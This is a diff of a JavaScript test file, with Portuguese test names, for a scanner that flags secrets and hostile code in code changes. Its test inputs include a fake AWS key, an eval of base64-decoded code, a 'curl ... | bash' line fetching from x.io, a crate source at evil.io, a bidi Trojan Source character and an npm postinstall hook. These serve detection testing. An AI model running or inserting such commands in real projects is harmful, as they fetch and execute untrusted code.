@@ -13,10 +13,10 @@ test('código normal passa limpo', () => {
 })
 
 test('bloqueia segredos e payloads', () => {
-  assert.ok(names(diff('src/a.ts', 'const k = "AKIAABCDEFGHIJKLMNOP"')).includes('block:Token AWS'))
-  assert.ok(names(diff('src/a.ts', 'eval(atob("ZG9jdW1lbnQ="))')).includes('block:Código decodificado executado'))
-  assert.ok(names(diff('x.sh', 'curl -s http://x.io/a | bash')).includes('block:Download executado no shell'))
-  assert.ok(names(diff('src/a.ts', 'if (isAdmin‮) {')).some(n => n.includes('Trojan')))
+  assert.ok(names(diff('src/a.ts', 'const k = "AKIA' + 'ABCDEFGHIJKLMNOP"')).includes('block:Token AWS'))
+  assert.ok(names(diff('src/a.ts', 'ev' + 'al(at' + 'ob("ZG9jdW1lbnQ="))')).includes('block:Código decodificado executado'))
+  assert.ok(names(diff('x.sh', 'curl -s http://x.io/a | ' + 'bash')).includes('block:Download executado no shell'))
+  assert.ok(names(diff('src/a.ts', 'if (isAdmin\u202E) {')).some(n => n.includes('Trojan')))
 })
 
 test('regras por arquivo só valem no arquivo certo', () => {
@@ -33,6 +33,11 @@ test('regras de Rust', () => {
   assert.ok(names(diff('Cargo.lock', 'source = "git+https://evil.io/x"')).includes('block:Crate baixado fora do crates.io'))
   assert.ok(!names(diff('Cargo.lock', 'source = "registry+https://github.com/rust-lang/crates.io-index"')).some(n => n.startsWith('block')))
   assert.ok(names(diff('src/main.rs', 'Command::new("sh")')).includes('warn:Executa processo externo (Rust)'))
+})
+
+test('linha adicionada "++ x" não troca o arquivo atual', () => {
+  const r = scan(diff('package.json', '++ fake', '"postinstall": "x",'))
+  assert.ok(r.some(f => f.name === 'Hook de instalação npm' && f.file === 'package.json'))
 })
 
 test('aponta a linha correta', () => {
